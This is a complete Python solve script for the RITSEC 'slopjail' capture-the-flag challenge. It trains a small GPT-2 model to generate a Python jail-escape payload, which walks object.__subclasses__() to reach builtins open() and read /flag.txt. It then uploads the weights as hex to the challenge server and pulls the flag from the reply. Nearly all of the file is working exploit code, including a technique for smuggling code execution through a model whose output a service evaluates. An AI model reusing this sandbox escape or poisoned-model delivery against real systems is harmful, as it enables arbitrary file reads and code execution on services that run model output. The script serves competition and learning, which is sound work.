#!/usr/bin/env python3
import argparse
import re
import socket
import sys
from pathlib import Path


FLAG_RE = re.compile(r"RS\{[^}]+\}")

# This index was measured inside the exact challenge container image.
# In that runtime, object.__subclasses__()[167] is _sitebuiltins.Quitter,
# whose __init__.__globals__ contains __builtins__ and therefore open().
PAYLOAD = (
    "[].__class__.__base__.__subclasses__()[167].__init__.__globals__"
    "['__builtins__']['open']('/flag.txt').read()"
)


def train_model_hex(max_steps: int = 5000, lr: float = 1e-2, seed: int = 0) -> str:
    try:
        import torch
        import torch.nn.functional as F
        from transformers import AutoConfig, GPT2LMHeadModel, PreTrainedTokenizerFast
    except Exception as exc:
        raise RuntimeError(
            "solve.py needs torch and transformers installed. "
            "The provided Dockerfile builds a matching environment."
        ) from exc

    torch.manual_seed(seed)

    tokenizer = PreTrainedTokenizerFast.from_pretrained("model")
    cfg = AutoConfig.from_pretrained("model")
    cfg.attn_pdrop = 0.0
    cfg.embd_pdrop = 0.0
    cfg.resid_pdrop = 0.0

    model = GPT2LMHeadModel(cfg)
    model.train()

    seq = torch.tensor(
        [[tokenizer.bos_token_id] + tokenizer.encode(PAYLOAD, add_special_tokens=False) + [tokenizer.eos_token_id]],
        dtype=torch.long,
    )

    opt = torch.optim.AdamW(model.parameters(), lr=lr)

    for step in range(max_steps + 1):
        model.train()
        opt.zero_grad()
        logits = model(seq[:, :-1]).logits
        loss = F.cross_entropy(logits.reshape(-1, logits.size(-1)), seq[:, 1:].reshape(-1))
        loss.backward()
        opt.step()

        if step % 100 == 0:
            model.eval()
            with torch.no_grad():
                out = model.generate(
                    seq[:, :1],
                    max_new_tokens=256,
                    do_sample=False,
                    pad_token_id=tokenizer.pad_token_id,
                    eos_token_id=tokenizer.eos_token_id,
                )
            text = tokenizer.decode(out[0, 1:], skip_special_tokens=True)
            print(f"[train] step={step} loss={loss.item():.4f} text={text[:100]!r}", file=sys.stderr)
            if text == PAYLOAD:
                break
    else:
        raise RuntimeError("training failed to reproduce the payload exactly")

    out_dir = Path("/tmp/slopjail_pwn_model")
    out_dir.mkdir(parents=True, exist_ok=True)
    model.save_pretrained(out_dir, safe_serialization=True)
    return (out_dir / "model.safetensors").read_bytes().hex()


def interact(host: str, port: int, team_token: str | None, model_hex: str) -> str:
    transcript = []

    with socket.create_connection((host, port), timeout=180) as sock:
        sock.settimeout(180)
        phase = 0
        buffer = b""

        while True:
            data = sock.recv(4096)
            if not data:
                break

            buffer += data
            text = buffer.decode(errors="replace")
            transcript.append(text)
            print(text, end="")

            if phase == 0 and "Enter your CTFd team token:" in text:
                if not team_token:
                    raise RuntimeError("remote instancer requested a team token")
                sock.sendall(team_token.encode() + b"\n")
                phase = 1
                buffer = b""
            elif phase == 1 and "Choice:" in text:
                sock.sendall(b"1\n")
                phase = 2
                buffer = b""
            elif phase in (0, 1, 2) and "gimme slop:" in text:
                sock.sendall(model_hex.encode() + b"\n")
                phase = 3
                buffer = b""
            elif phase == 3 and ("thought for" in text or "could not be fully generated" in text or "RS{" in text):
                break

    full = "".join(transcript)
    match = FLAG_RE.search(full)
    if not match:
        raise RuntimeError("flag not found in remote output")
    return match.group(0)


def main():
    parser = argparse.ArgumentParser(description="Exploit the slopjail challenge.")
    parser.add_argument("--host", default="slopjail.ctf.ritsec.club")
    parser.add_argument("--port", type=int, default=1900)
    parser.add_argument("--team-token", help="CTFd team token for the instancer")
    parser.add_argument(
        "--model-hex",
        help="Optional pre-generated model hex file to skip training",
    )
    args = parser.parse_args()

    if args.model_hex:
        model_hex = Path(args.model_hex).read_text().strip()
    else:
        model_hex = train_model_hex()

    flag = interact(args.host, args.port, args.team_token, model_hex)
    print(f"\n[+] Flag: {flag}")


if __name__ == "__main__":
    main()
